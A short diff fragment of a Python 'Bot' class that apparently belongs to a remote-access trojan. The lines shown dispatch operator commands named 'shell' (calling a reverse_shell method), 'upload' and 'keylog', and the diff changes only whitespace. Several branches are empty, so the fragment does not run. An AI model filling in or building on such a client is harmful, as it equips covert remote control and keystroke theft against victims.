@@ -31,7 +31,8 @@ class Bot(object):
 						if cmd == 'shell':
 							self.reverse_shell()
 						if cmd == 'upload':
-							
+
 						if cmd == 'keylog':
 
 			except:
+				
